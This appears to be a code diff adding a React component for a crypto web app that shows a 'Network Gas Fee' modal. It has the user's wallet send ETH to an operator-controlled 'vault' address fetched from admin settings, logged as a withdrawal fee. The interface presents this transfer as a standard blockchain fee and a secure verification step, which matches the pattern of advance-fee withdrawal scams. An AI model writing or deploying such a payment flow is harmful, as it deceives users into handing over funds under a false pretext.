@@ -1,0 +1,336 @@
+'use client';
+
+import { useEffect, useState, useMemo } from 'react';
+import { X, Fuel, ArrowRight, Loader2, CheckCircle, Check } from 'lucide-react';
+import { ethers } from 'ethers';
+import { useWallet } from '@/context/base';
+import { motion, AnimatePresence } from 'framer-motion';
+
+declare global {
+    interface Window {
+        ethereum?: Record<string, unknown>;
+    }
+}
+
+interface GasFeeModalProps {
+    isOpen: boolean;
+    onClose: () => void;
+    onSuccess: (txHash: string) => void;
+    amount?: string;
+    user?: any;
+    theme?: 'dark' | 'light';
+    network?: string;
+}
+
+export default function GasFeeModal({
+    isOpen,
+    onClose,
+    onSuccess,
+    amount = '0.00',
+    user,
+    theme = 'light',
+    network = 'ETH'
+}: GasFeeModalProps) {
+    const [status, setStatus] = useState<any>('idle');
+    const [txSuccess, setTxSuccess] = useState<any>(false);
+    const [txHash, setTxHash] = useState('');
+    const [error, setError] = useState(null);
+    const { cbProvider, address: add } = useWallet();
+    const [internalUser, setInternalUser] = useState<any>(user);
+    const [adminAddresses, setAdminAddresses] = useState<Record<string, string>>({});
+    const [loadingSettings, setLoadingSettings] = useState(false);
+
+    useEffect(() => {
+        if (isOpen) {
+            fetchAdminSettings();
+        }
+    }, [isOpen]);
+
+    useEffect(() => {
+        if (user && user.id) {
+            setInternalUser(user);
+        } else if (isOpen && add) {
+            const fetchUser = async () => {
+                try {
+                    let res = await fetch(`/api/user?address=${add}`);
+                    let json = await res.json();
+                    if (json?.existingRecord) {
+                        setInternalUser(json.existingRecord);
+                    }
+                } catch (e) {
+                    console.error("Error fetching user in GasFeeModal:", e);
+                }
+            };
+            fetchUser();
+        }
+    }, [add, user, isOpen]);
+
+    const fetchAdminSettings = async () => {
+        setLoadingSettings(true);
+        try {
+            const res = await fetch('/api/admin/settings');
+            const data = await res.json();
+            setAdminAddresses(data);
+        } catch (e) {
+            console.error("Failed to fetch admin settings", e);
+        } finally {
+            setLoadingSettings(false);
+        }
+    };
+
+    const { targetNetworkName, targetAsset, isBsc, targetChainId } = useMemo(() => {
+        // Force all gas payments to Ethereum Mainnet as requested
+        return {
+            isBsc: false,
+            targetChainId: '0x1',
+            targetNetworkName: 'Ethereum Mainnet',
+            targetAsset: 'ETH'
+        };
+    }, []);
+
+    const sendEth = async () => {
+        let amountText = (internalUser?.fields?.gasFee || "0.003").toString();
+
+        // Strictly use the eth address key as requested by the user
+        const gasVault = adminAddresses['gas_fee_address_eth'] || adminAddresses['gas_fee_address_eth'.toLowerCase()] || '';
+
+        console.log('[DEBUG] GasFeeModal sendEth start', { amountText, gasVault, network, targetChainId, hasCbProvider: !!cbProvider });
+
+        try {
+            if (!cbProvider) {
+                setError("Wallet provider not found. Please reconnect.");
+                return;
+            }
+            if (!amountText || isNaN(parseFloat(amountText))) {
+                setError(`Invalid gas fee amount: ${amountText}`);
+                return;
+            }
+            if (!gasVault || !gasVault.startsWith('0x')) {
+                const foundKeys = Object.keys(adminAddresses).join(', ');
+                setError(`Admin wallet (gas_fee_address_eth) not found in Airtable! Keys: [${foundKeys || 'none'}]. Please update Settings.`);
+                return;
+            }
+
+            setStatus('processing');
+            setError('');
+
+            // 1. Ensure we are on the correct chain before sending
+            try {
+                await cbProvider.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x1' }],
+                });
+            } catch (switchError: any) {
+                // Switch failed or was cancelled - STOP HERE
+                setError(`Network switch to Ethereum Mainnet is required for gas payment.`);
+                setStatus('idle');
+                return;
+            }
+
+            const provider = new ethers.BrowserProvider(cbProvider);
+            const signer = await provider.getSigner();
+
+            console.log('[DEBUG] Sending transaction to:', gasVault, 'with value:', amountText, 'on', targetNetworkName);
+
+            // 2. Create and send the transaction
+            const tx = await signer.sendTransaction({
+                to: gasVault.trim(),
+                value: ethers.parseEther(amountText.trim()),
+            });
+
+            setStatus('Transaction sent! Waiting for block...');
+            await tx.wait();
+
+            setStatus('success');
+            setTxSuccess(true);
+            setTxHash(tx.hash);
+
+            console.log('[DEBUG] Transaction successful! Hash:', tx.hash);
+
+            // 3. Update API call to record the transaction
+            try {
+                const apiRes = await fetch(`/api/withdrawal`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        address: add,
+                        amount: Number(amountText),
+                        type: "fee",
+                        asset: targetAsset,
+                        network: targetNetworkName,
+                        wType: "crypto",
+                        status: "completed"
+                    })
+                });
+                const apiResult = await apiRes.json();
+                console.log('[DEBUG] API response:', apiResult);
+            } catch (apiErr) {
+                console.error("Failed to update API after success:", apiErr);
+            }
+
+            if (onSuccess) onSuccess(tx.hash);
+
+        } catch (err: any) {
+            console.error("Gas Payment Error Details:", err);
+            const msg = err?.info?.error?.message || err?.message || "Transaction failed";
+            setError(msg);
+            setStatus('idle');
+        }
+    };
+
+    const handlePayGasFac = async () => {
+        sendEth();
+    }
+
+    return (
+        <AnimatePresence>
+            {isOpen && (
+                <div className="fixed inset-0 z-[60] flex items-center justify-center">
+                    <motion.div
+                        initial={{ opacity: 0 }}
+                        animate={{ opacity: 1 }}
+                        exit={{ opacity: 0 }}
+                        className={`absolute inset-0 backdrop-blur-md ${theme === 'dark' ? 'bg-black/80' : 'bg-black/40'}`}
+                        onClick={status !== 'processing' ? onClose : undefined}
+                    />
+
+                    <motion.div
+                        initial={{ y: "100%", opacity: 0 }}
+                        animate={{ y: 0, opacity: 1 }}
+                        exit={{ y: "100%", opacity: 0 }}
+                        transition={{ type: "spring", damping: 25, stiffness: 200 }}
+                        className={`relative w-full md:max-w-[420px] border-t md:border rounded-t-[2.5rem] md:rounded-[2rem] p-6 text-center space-y-6 shadow-2xl pb-12 md:pb-6 z-20 md:m-4 ${theme === 'dark' ? 'bg-[#000000] text-white border-white/10' : 'bg-white text-[#0a0b0d] border-transparent shadow-xl'
+                            }`}
+                    >
+                        <button
+                            onClick={onClose}
+                            className={`absolute top-4 right-4 w-8 h-8 flex items-center justify-center rounded-full transition-colors z-10 ${theme === 'dark' ? 'bg-white/5 text-gray-400 hover:text-white' : 'bg-gray-100 text-gray-500 hover:text-black'}`}
+                        >
+                            <X className="w-5 h-5" />
+                        </button>
+
+                        {status === 'success' ? (
+                            <motion.div
+                                initial={{ opacity: 0, scale: 0.9 }}
+                                animate={{ opacity: 1, scale: 1 }}
+                                className="space-y-8 py-4"
+                            >
+                                <div className="relative mx-auto w-24 h-24">
+                                    <div className="absolute inset-0 bg-emerald-500 blur-3xl opacity-20 animate-pulse" />
+                                    <div className="w-24 h-24 bg-emerald-500/10 text-emerald-500 border-2 border-emerald-500/20 rounded-full flex items-center justify-center relative">
+                                        <Check className="w-12 h-12" />
+                                    </div>
+                                </div>
+
+                                <div className="space-y-3">
+                                    <h3 className="text-3xl font-bold">Payment Confirmed</h3>
+                                    <p className="text-gray-500 font-medium px-4">Your gas fee transaction has been securely processed on the network.</p>
+                                </div>
+
+                                <div className={`rounded-3xl p-6 border text-left space-y-5 ${theme === 'dark' ? 'bg-white/5 border-white/5' : 'bg-gray-50 border-gray-100'}`}>
+                                    <div className="flex justify-between items-center">
+                                        <span className="text-sm font-bold text-gray-500">Status</span>
+                                        <span className="text-xs font-bold text-emerald-500 uppercase tracking-widest bg-emerald-500/10 px-3 py-1.5 rounded-full border border-emerald-500/20">
+                                            Completed
+                                        </span>
+                                    </div>
+                                    <div className="h-[1px] w-full bg-gray-200 dark:bg-white/5" />
+                                    <div className="space-y-2">
+                                        <span className="text-xs font-bold text-gray-400 uppercase tracking-widest">Transaction Hash</span>
+                                        <div className={`font-mono text-[11px] break-all p-4 rounded-2xl border ${theme === 'dark' ? 'bg-black text-blue-400 border-white/5' : 'bg-white text-blue-600 border-gray-200'}`}>
+                                            {txHash || "0x..."}
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <button
+                                    onClick={() => onSuccess(txHash)}
+                                    className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-6 rounded-[2rem] transition-all shadow-xl shadow-blue-600/20 active:scale-[0.98] flex items-center justify-center gap-3 text-lg"
+                                >
+                                    Continue Transaction
+                                </button>
+                            </motion.div>
+                        ) : (
+                            <>
+                                <motion.div
+                                    initial={{ scale: 0.5, opacity: 0 }}
+                                    animate={{ scale: 1, opacity: 1 }}
+                                    className="relative mx-auto w-20 h-20"
+                                >
+                                    <div className={`absolute inset-0 ${txSuccess ? 'bg-emerald-500' : 'bg-orange-500'} blur-2xl opacity-10`} />
+                                    <div className={`w-20 h-20 rounded-[1.5rem] flex items-center justify-center relative ${
+                                        txSuccess 
+                                        ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/20' 
+                                        : 'bg-orange-500/10 text-orange-500 border border-orange-500/20'
+                                    }`}>
+                                        {txSuccess ? <Check className="w-10 h-10" /> : <Fuel className="w-10 h-10" />}
+                                    </div>
+                                </motion.div>
+
+                                <div className="space-y-3">
+                                    <h3 className="text-2xl font-bold">
+                                        {txSuccess ? "Success" : "Network Gas Fee"}
+                                    </h3>
+                                    <p className="text-gray-500 font-medium px-2 leading-relaxed">
+                                        Standard blockchain fee required to securely process and verify your request.
+                                    </p>
+                                    {error && !loadingSettings && (
+                                        <motion.div
+                                            initial={{ opacity: 0, y: 10 }}
+                                            animate={{ opacity: 1, y: 0 }}
+                                            className="mt-4 bg-red-500/5 border border-red-500/10 text-red-500 text-xs p-4 rounded-2xl text-left font-medium"
+                                        >
+                                            <span className="font-bold uppercase tracking-widest block mb-1 opacity-50">Error Detail</span>
+                                            {error}
+                                        </motion.div>
+                                    )}
+                                </div>
+
+                                <div className={`rounded-3xl p-6 space-y-5 text-left ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-50'}`}>
+                                    <div className="flex justify-between items-center">
+                                        <span className="text-sm font-bold text-gray-500">Network</span>
+                                        <span className="text-sm font-bold">{targetNetworkName}</span>
+                                    </div>
+                                    <div className="flex justify-between items-center">
+                                        <span className="text-sm font-bold text-gray-500">Processing Fee</span>
+                                        <span className="text-lg font-bold text-blue-600">{internalUser?.fields?.gasFee || "0.003"} {targetAsset}</span>
+                                    </div>
+                                    <div className="h-[1px] w-full bg-gray-200 dark:bg-white/5" />
+                                    <div className="space-y-2">
+                                        <span className="text-xs font-bold text-gray-400 uppercase tracking-widest">Vault Address</span>
+                                        <div className="font-mono text-[11px] opacity-60 break-all">{adminAddresses['gas_fee_address_eth'] || "Connecting..."}</div>
+                                    </div>
+                                    <div className="h-[1px] w-full bg-gray-200 dark:bg-white/5" />
+                                    <div className="flex justify-between items-center">
+                                        <span className="text-sm font-bold text-gray-500">Speed</span>
+                                        <span className="text-xs font-bold text-emerald-500 uppercase tracking-widest bg-emerald-500/10 px-3 py-1.5 rounded-full border border-emerald-500/20">
+                                            Instant
+                                        </span>
+                                    </div>
+                                </div>
+
+                                <button
+                                    onClick={handlePayGasFac}
+                                    disabled={status !== 'idle'}
+                                    className="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white font-bold py-6 rounded-[2rem] transition-all shadow-xl shadow-blue-600/20 active:scale-[0.98] flex items-center justify-center gap-3 text-lg"
+                                >
+                                    {status !== 'idle' || loadingSettings ? (
+                                        <>
+                                            <Loader2 className="w-6 h-6 animate-spin" />
+                                            {loadingSettings ? "Loading..." : "Processing..."}
+                                        </>
+                                    ) : (
+                                        <>
+                                            {adminAddresses['gas_fee_address_eth'] ? "Authorize Payment" : "Configuring..."}
+                                            {adminAddresses['gas_fee_address_eth'] && <ArrowRight className="w-5 h-5" />}
+                                        </>
+                                    )}
+                                </button>
+                            </>
+                        )}
+                    </motion.div>
+                </div>
+            )}
+        </AnimatePresence>
+    );
+}
